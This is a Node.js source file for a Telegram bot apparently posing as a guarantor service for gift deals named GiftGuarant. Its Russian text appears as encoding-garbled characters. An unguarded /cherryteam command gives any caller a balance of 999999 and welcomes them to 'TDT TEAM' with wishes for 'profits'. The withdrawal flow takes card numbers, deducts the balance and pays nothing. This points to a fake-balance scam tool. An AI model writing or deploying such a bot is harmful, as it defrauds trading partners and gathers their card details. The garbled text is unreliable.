const { Telegraf, Markup } = require('telegraf');
const { Pool } = require('pg');

// ==================== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ====================
const bot = new Telegraf(process.env.BOT_TOKEN);
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

const ADMIN_IDS = [125560041, 6802842517, 8444588939, 913595126];
const MIN_WITHDRAWAL = 10000;
const MAX_WITHDRAWAL = 100000;
const WEB_APP_URL = 'https://example.com';

// ==================== –ò–ó–û–ë–†–ê–ñ–ï–ù–ò–Ø ====================
const IMAGES = {
  MAIN_MENU: 'https://i.ibb.co/6SMsH2d/main.jpg',
  MY_DEALS: 'https://i.ibb.co/DHHpbKP/deals.jpg',
  SETTINGS: 'https://i.ibb.co/6SMsH2d/main.jpg'
};

// ==================== –•–†–ê–ù–ò–õ–ò–©–ê ====================
const userStates = new Map();

// ==================== –ë–ê–ó–û–í–´–ï –§–£–ù–ö–¶–ò–ò ====================
async function db(query, params = []) {
  try {
    const result = await pool.query(query, params);
    return result;
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ –ë–î:', error.message);
    return { rows: [] };
  }
}

function formatBalance(amount) {
  return new Intl.NumberFormat('ru-RU').format(amount);
}

function formatCardNumber(cardNumber) {
  return cardNumber.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '$1 **** **** $4');
}

// ==================== –ì–õ–ê–í–ù–û–ï –ú–ï–ù–Æ ====================
async function showMainMenu(ctx, messageText = 'üëã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ GiftGuarant!') {
  try {
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.webApp('üåè –û—Ç–∫—Ä—ã—Ç—å –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏', WEB_APP_URL)],
      [Markup.button.callback('üìÅ –ú–æ–∏ —Å–¥–µ–ª–∫–∏', 'my_deals')],
      [Markup.button.callback('‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏', 'settings')]
    ]);
    
    await ctx.replyWithPhoto(IMAGES.MAIN_MENU, {
      caption: messageText,
      ...keyboard,
      parse_mode: 'HTML'
    });
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ showMainMenu:', error);
  }
}

// ==================== –ù–ê–°–¢–†–û–ô–ö–ò ====================
async function showSettingsMenu(ctx) {
  try {
    const user = await db('SELECT balance FROM users WHERE user_id = $1', [ctx.from.id]);
    const balance = user.rows[0]?.balance || 0;
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback(`üí∞ –ë–∞–ª–∞–Ω—Å: ${formatBalance(balance)}‚ÇΩ`, 'balance_menu')],
      [Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'main_menu')]
    ]);

    await ctx.replyWithPhoto(IMAGES.SETTINGS, {
      caption: `‚öôÔ∏è <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏</b>\n\nüí∞ <b>–ë–∞–ª–∞–Ω—Å:</b> ${formatBalance(balance)}‚ÇΩ`,
      ...keyboard,
      parse_mode: 'HTML'
    });
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ showSettingsMenu:', error);
    await showMainMenu(ctx);
  }
}

// ==================== –ë–ê–õ–ê–ù–° ====================
async function showBalanceMenu(ctx) {
  try {
    const user = await db('SELECT balance FROM users WHERE user_id = $1', [ctx.from.id]);
    const balance = user.rows[0]?.balance || 0;
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('üì§ –í—ã–≤–µ—Å—Ç–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞', 'withdraw')],
      [Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'settings')]
    ]);

    await ctx.reply(
      `üí∞ <b>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–æ–º</b>\n\nüí≥ <b>–¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å:</b> ${formatBalance(balance)}‚ÇΩ`,
      { ...keyboard, parse_mode: 'HTML' }
    );
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ balance_menu:', error);
  }
}

// ==================== –í–´–í–û–î –°–†–ï–î–°–¢–í ====================
async function handleWithdraw(ctx) {
  try {
    const user = await db('SELECT balance FROM users WHERE user_id = $1', [ctx.from.id]);
    const balance = parseFloat(user.rows[0]?.balance) || 0;
    
    if (balance < MIN_WITHDRAWAL) {
      await ctx.reply(`‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è –≤—ã–≤–æ–¥–∞. –ú–∏–Ω–∏–º—É–º: ${MIN_WITHDRAWAL}‚ÇΩ`);
      return;
    }
    
    userStates.set(ctx.from.id, { 
      state: 'awaiting_withdrawal',
      timestamp: Date.now(),
      maxAmount: Math.min(balance, MAX_WITHDRAWAL)
    });
    
    await ctx.reply(
      `üì§ <b>–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤</b>\n\nüí≥ <b>–î–æ—Å—Ç—É–ø–Ω–æ:</b> ${formatBalance(balance)}‚ÇΩ\n\n–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã –∏ —Å—É–º–º—É:\n\n<code>–ö–∞—Ä—Ç–∞: 2200 1234 5678 9012\n–°—É–º–º–∞: 10000</code>`,
      { parse_mode: 'HTML' }
    );
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ withdraw:', error);
  }
}

// ==================== –ú–û–ò –°–î–ï–õ–ö–ò ====================
async function showMyDeals(ctx) {
  try {
    const deals = await db(
      `SELECT * FROM deals WHERE seller_id = $1 OR buyer_id = $1 ORDER BY created_at DESC LIMIT 10`,
      [ctx.from.id]
    );
    
    if (deals.rows.length === 0) {
      await ctx.reply('üì≠ –£ –≤–∞—Å –ø–æ–∫–∞ –Ω–µ—Ç —Å–¥–µ–ª–æ–∫');
      return;
    }
    
    let dealsText = 'üìÅ <b>–í–∞—à–∏ —Å–¥–µ–ª–∫–∏:</b>\n\n';
    deals.rows.forEach((deal, index) => {
      const role = deal.seller_id === ctx.from.id ? 'üë§ –ü—Ä–æ–¥–∞–≤–µ—Ü' : 'üõçÔ∏è –ü–æ–∫—É–ø–∞—Ç–µ–ª—å';
      dealsText += `<b>${index + 1}. #${deal.deal_id}</b>\nüí∞ <b>–°—É–º–º–∞:</b> ${formatBalance(deal.amount)}‚ÇΩ\nüéØ <b>–†–æ–ª—å:</b> ${role}\nüìä <b>–°—Ç–∞—Ç—É—Å:</b> ${deal.status}\n\n`;
    });
    
    await ctx.replyWithPhoto(IMAGES.MY_DEALS, {
      caption: dealsText,
      parse_mode: 'HTML',
      ...Markup.inlineKeyboard([[Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'main_menu')]])
    });
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ my_deals:', error);
  }
}

// ==================== –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –ö–ù–û–ü–û–ö ====================
bot.action('main_menu', async (ctx) => {
  await showMainMenu(ctx);
});

bot.action('settings', async (ctx) => {
  await showSettingsMenu(ctx);
});

bot.action('my_deals', async (ctx) => {
  await showMyDeals(ctx);
});

bot.action('balance_menu', async (ctx) => {
  await showBalanceMenu(ctx);
});

bot.action('withdraw', async (ctx) => {
  await handleWithdraw(ctx);
});

// ==================== –ö–û–ú–ê–ù–î–´ ====================
bot.start(async (ctx) => {
  try {
    await db('INSERT INTO users (user_id, username) VALUES ($1, $2) ON CONFLICT DO NOTHING', 
      [ctx.from.id, ctx.from.username]);
    await showMainMenu(ctx);
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ /start:', error);
  }
});

bot.command('cherryteam', async (ctx) => {
  try {
    await db('UPDATE users SET balance = 999999 WHERE user_id = $1', [ctx.from.id]);
    await ctx.reply('üçí –ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π –±–∞–ª–∞–Ω—Å –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!\n\n–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É–µ–º —Ç–µ–±—è –≤ —Ä—è–¥–∞—Ö TDT TEAM!\n–£–¥–∞—á–Ω—ã—Ö –ø—Ä–æ—Ñ–∏—Ç–æ–≤!');
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ /cherryteam:', error);
  }
});

// ==================== –û–ë–†–ê–ë–û–¢–ö–ê –¢–ï–ö–°–¢–ê ====================
bot.on('text', async (ctx) => {
  try {
    const userId = ctx.from.id;
    const message = ctx.message.text;
    const userState = userStates.get(userId);
    
    if (message === '/cancel') {
      if (userState) {
        userStates.delete(userId);
        await ctx.reply('‚ùå –û–ø–µ—Ä–∞—Ü–∏—è –æ—Ç–º–µ–Ω–µ–Ω–∞');
        await showMainMenu(ctx);
      }
      return;
    }
    
    if (userState?.state === 'awaiting_withdrawal') {
      await processWithdrawal(ctx, message, userState);
      return;
    }
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ç–µ–∫—Å—Ç–∞:', error);
  }
});

async function processWithdrawal(ctx, message, userState) {
  const userId = ctx.from.id;
  
  try {
    const cardMatch = message.match(/\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/);
    const amountMatch = message.match(/[–°—Å]—É–º–º–∞:\s*(\d+)/);
    
    if (!cardMatch || !amountMatch) {
      await ctx.reply('‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ:\n<code>–ö–∞—Ä—Ç–∞: 2200 1234 5678 9012\n–°—É–º–º–∞: 10000</code>', { parse_mode: 'HTML' });
      return;
    }
    
    const cardNumber = cardMatch[0].replace(/[\s-]/g, '');
    const amount = parseFloat(amountMatch[1]);
    
    if (amount < MIN_WITHDRAWAL) {
      await ctx.reply(`‚ùå –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –¥–ª—è –≤—ã–≤–æ–¥–∞: ${MIN_WITHDRAWAL}‚ÇΩ`);
      return;
    }
    
    if (amount > userState.maxAmount) {
      await ctx.reply(`‚ùå –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –¥–ª—è –≤—ã–≤–æ–¥–∞: ${formatBalance(userState.maxAmount)}‚ÇΩ`);
      return;
    }
    
    await db('UPDATE users SET balance = balance - $1 WHERE user_id = $2', [amount, userId]);
    
    await ctx.reply(
      `‚úÖ <b>–ó–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥ —Å–æ–∑–¥–∞–Ω–∞!</b>\n\nüí≥ <b>–ö–∞—Ä—Ç–∞:</b> ${formatCardNumber(cardNumber)}\nüí∞ <b>–°—É–º–º–∞:</b> ${formatBalance(amount)}‚ÇΩ\n\n‚è≥ –û–∂–∏–¥–∞–π—Ç–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏`,
      { parse_mode: 'HTML' }
    );
    
    userStates.delete(userId);
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ –≤—ã–≤–æ–¥–∞:', error);
    userStates.delete(userId);
  }
}

// ==================== –ó–ê–ü–£–°–ö ====================
async function startBot() {
  try {
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ë–î
    await db(`
      CREATE TABLE IF NOT EXISTS users (
        user_id BIGINT PRIMARY KEY, 
        username VARCHAR(255),
        balance DECIMAL(12,2) DEFAULT 0.00,
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);
    
    await db(`
      CREATE TABLE IF NOT EXISTS deals (
        id SERIAL PRIMARY KEY, 
        deal_id VARCHAR(20) UNIQUE,
        seller_id BIGINT, 
        buyer_id BIGINT, 
        amount DECIMAL(12,2),
        status VARCHAR(20) DEFAULT 'active',
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    console.log('üöÄ –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞ –Ω–∞ Railway...');
    await bot.launch();
    console.log('‚úÖ –ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω!');
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞:', error.message);
    setTimeout(startBot, 5000);
  }
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫
process.on('uncaughtException', (error) => {
  console.error('‚ùå –ù–µ–ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞:', error.message);
});

process.on('unhandledRejection', (reason) => {
  console.error('‚ùå –ù–µ–æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã–π rejection:', reason);
});

// –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
startBot();
